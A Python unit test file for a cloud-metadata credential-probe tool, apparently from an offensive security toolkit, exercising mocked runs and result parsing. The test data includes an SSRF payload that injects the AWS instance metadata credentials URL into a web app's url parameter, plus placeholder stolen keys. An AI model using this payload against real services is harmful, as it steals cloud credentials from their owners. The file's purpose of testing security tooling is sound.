"""
Unit tests for CloudMetadataCredentialProbe tool glue.
"""
from unittest.mock import patch

from tradecraft.adapters.cloud_metadata_credential_probe.execute import (
    HttpExchange,
    RawCredentialTheftResult,
)
from tradecraft.tools.cloud_metadata_credential_probe import CloudMetadataCredentialProbe
from tradecraft.tools.registry import ALL_TOOLS


def test_tool_identity_and_contract():
    tool = CloudMetadataCredentialProbe()
    assert tool.tool_id == "cloud_metadata_credential_probe"
    assert tool.spec.name == "cloud_metadata_credential_probe"
    assert tool.scope_param == "target"
    assert tool.destructive is False
    assert tool.required_binary is None
    assert any(t.tool_id == "cloud_metadata_credential_probe" for t in ALL_TOOLS)


def test_run_forwards_all_params_and_returns_parsed():
    tool = CloudMetadataCredentialProbe()
    raw = RawCredentialTheftResult(
        target="https://shop.example.com/api/preview?url=__SSRF__",
        provider="aws",
        inject_location="url_param",
        role_name="node-role",
        raw_credential_json='{"AccessKeyId": "ASIA123", "SecretAccessKey": "sec456", "Token": "tok789"}',
        exchanges=[
            HttpExchange(
                step="aws_credential_fetch",
                target_url="https://shop.example.com/api/preview?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/node-role",
                injected_url="http://169.254.169.254/latest/meta-data/iam/security-credentials/node-role",
                status_code=200,
            )
        ],
    )

    with patch("tradecraft.tools.cloud_metadata_credential_probe.probe_execute", return_value=raw) as mock_exec:
        out = tool.run(
            target="https://shop.example.com/api/preview?url=__SSRF__",
            provider="aws",
            inject_location="url_param",
            method="GET",
            json_body_template="",
            header_name="",
            role_name="node-role",
            timeout=8,
        )

    mock_exec.assert_called_once_with(
        target="https://shop.example.com/api/preview?url=__SSRF__",
        provider="aws",
        inject_location="url_param",
        method="GET",
        json_body_template="",
        header_name="",
        role_name="node-role",
        timeout=8,
    )
    assert out["credentials_obtained"] is True
    assert out["credentials"]["access_key_id"] == "ASIA123"
    assert out["role_name"] == "node-role"


def test_extract_facts_with_obtained_credentials():
    tool = CloudMetadataCredentialProbe()
    res = {
        "provider": "aws",
        "credentials_obtained": True,
        "role_name": "eks-worker-role",
        "credentials": {"access_key_id": "ASIA123"},
    }

    facts = tool.extract_facts({"target": "https://shop.example.com/api/fetch?url=__SSRF__"}, res)
    assert len(facts) == 1
    assert facts[0]["host"] == "shop.example.com"
    assert facts[0]["port"] == 443
    assert facts[0]["credentials_obtained"] is True
    assert facts[0]["severity"] == "critical"
    assert facts[0]["role"] == "eks-worker-role"
    assert "IMDS temporary credential exposure via SSRF" in facts[0]["vulnerability"]


def test_extract_facts_tested_without_creds():
    tool = CloudMetadataCredentialProbe()
    res = {
        "provider": "aws",
        "credentials_obtained": False,
        "summary": "403 Forbidden",
    }

    facts = tool.extract_facts({"target": "https://target.com/fetch"}, res)
    assert len(facts) == 1
    assert facts[0]["imds_tested"] is True
    assert "vulnerability" not in facts[0]


def test_extract_facts_empty_on_error():
    tool = CloudMetadataCredentialProbe()
    facts = tool.extract_facts({"target": "https://target.com"}, {"error": "failed to connect"})
    assert facts == []
